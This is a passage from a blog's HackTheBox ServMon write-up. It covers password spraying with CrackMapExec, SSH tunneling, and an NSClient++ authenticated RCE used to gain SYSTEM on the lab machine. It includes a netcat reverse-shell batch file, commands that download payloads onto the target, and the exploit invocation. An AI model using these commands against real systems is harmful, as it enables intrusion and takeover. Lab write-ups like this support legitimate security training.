</code></pre></div></li></ul><p>With these, a password spray can be performed using <code>CrackMapExec</code>. It hits on <code>nadine:L1k3B1gBut7s@W0rk</code> pair.</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash>→ root@iamf «servmon» «10.10.14.23»
$ crackmapexec smb htb.servmon -u users -p passwords
...&lt;SNIP&gt;...
SMB         10.10.10.184    <span class=m>445</span>    SERVMON          <span class=o>[</span>+<span class=o>]</span> SERVMON<span class=se>\n</span>adine:L1k3B1gBut7s@W0rk 
...&lt;SNIP&gt;...
</code></pre></div><h4 id=ssh-access>SSH access<a class=anchor aria-hidden=true href=#ssh-access>#</a></h4><p>The credentials also work on SSH.</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash>→ root@iamf «servmon» «10.10.14.23»
$ ssh nadine@htb.servmon
</code></pre></div><center><p><img class=img-container src=imgs/image-20210407055115129.png alt=image-20210407055115129></p></center><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-nt-authoritysystem>Shell as NT Authority\System<a class=anchor aria-hidden=true href=#shell-as-nt-authoritysystem>#</a></h3><h4 id=obtain-nsclient-password>Obtain NSClient++ password<a class=anchor aria-hidden=true href=#obtain-nsclient-password>#</a></h4><div class=highlight><pre class=chroma><code class=language-text data-lang=text>3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
</code></pre></div><p>Recall the to do list from previous enumeration, I discovered a password for NSClient++ in its default installation folder.</p><div class=highlight><pre class=chroma><code class=language-powershell data-lang=powershell><span class=nb>PS </span><span class=n>C:</span><span class=p>\&gt;</span> <span class=nb>gc </span><span class=s1>&#39;Program Files\NSClient++\nsclient.ini&#39;</span>
</code></pre></div><center><p><img class=img-container src=imgs/image-20210407055600651.png alt=image-20210407055600651></p></center><p>I&rsquo;ll try the <a href=https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html>scripted PoC</a>. But before that, I&rsquo;ll need to tunnel the connection first. This is because the config file is set to local only, so I can&rsquo;t perform exploit directly from outside.</p><h4 id=ssh-tunneling>SSH Tunneling<a class=anchor aria-hidden=true href=#ssh-tunneling>#</a></h4><p>SSH has tunneling features which allow me to access ServMon localhost and port from my localhost and specified port. For this, I&rsquo;ll create another SSH connection for tunneling.</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash>→ root@iamf «servmon» «10.10.14.23»
$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 
</code></pre></div><p><code>-L 8443:127.0.0.1:8443</code> means it will forward any connection on my localhost port 8443 to remote localhost on port 8443. In this case, ServMon is the remote. Now I can perform exploitation.</p><h4 id=nsclient-exploit-poc>NSClient++ Exploit PoC<a class=anchor aria-hidden=true href=#nsclient-exploit-poc>#</a></h4><p>First, I&rsquo;ll create a batch, called <code>sans.bat</code> file on my machine.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>@echo off

C:\Temp\nc.exe 10.10.14.23 443 -e powershell.exe
</code></pre></div><p>Once it created, I&rsquo;ll transfer the file to ServMon on <code>C:\temp\</code> via python http server along with <code>netcat</code> for windows.</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash>→ root@iamf «servmon» «10.10.14.23»
$ Python -m SimpleHTTPServer <span class=m>80</span>
</code></pre></div><p>Get the hosted files on ServMon</p><pre><code>PS C:\&gt; Invoke-webrequest -uri http://10.10.14.23/reverse -outfile C:/temp/reverse.bat

PS C:\&gt; Invoke-webrequest -uri http://10.10.14.23/nc.exe -outfile C:/temp/nc.exe
</code></pre><p>Now I&rsquo;ll setup a listener on my Kali.</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash>→ root@iamf «servmon» «10.10.14.23»
$ nc -nlvvp <span class=m>443</span>
</code></pre></div><p>Then I can just run the exploit and wait on my listener.</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash>→ root@iamf «servmon» «10.10.14.23»
$ python3 nsRCE.py -t 127.0.0.1 -P <span class=m>8443</span> -p <span class=s1>&#39;ew2x6SsGTxjRwXOT&#39;</span> -c <span class=s2>&#34;c:\temp\reverse.bat&#34;</span>
</code></pre></div><p>Now I have an interactive shell as NT Authority\SYSTEM.</p><p><img class=img-container src=imgs/image-20210407063703741.png alt=image-20210407063703741></p><hr><h2 id=references>References<a class=anchor aria-hidden=true href=#references>#</a></h2><ul><li><a href=https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html>https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/oscp-like/>OSCP-like</a></li><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/directory-traversal/>Directory-traversal</a></li><li><a href=https://fahmifj.github.io/tags/nvms-1000/>NVMS-1000</a></li><li><a href=https://fahmifj.github.io/tags/nsclient/>NSClient</a></li><li><a href=https://fahmifj.github.io/tags/tunneling/>Tunneling</a></li></ul><nav class=paginav><a class=prev href=https://fahmifj.github.io/writeups/hackthebox/htb-sauna/><span class=title>« Prev Page</span><br><span>HackTheBox - Sauna</span></a>
<a class=next href=https://fahmifj.github.io/writeups/hackthebox/htb-remote/><span class=title>Next Page »</span><br><span>HackTheBox - Remote</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - ServMon on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20ServMon&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-servmon%2f&hashtags=OSCP-like%2cWindows%2cDirectory-traversal%2cNVMS-1000%2cNSClient%2cTunneling"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - ServMon on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-servmon%2f&title=HackTheBox%20-%20ServMon&summary=HackTheBox%20-%20ServMon&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-servmon%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - ServMon on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-servmon%2f&title=HackTheBox%20-%20ServMon"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - ServMon on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-servmon%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - ServMon on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20ServMon%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-servmon%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - ServMon on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20ServMon&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-servmon%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script></body></html>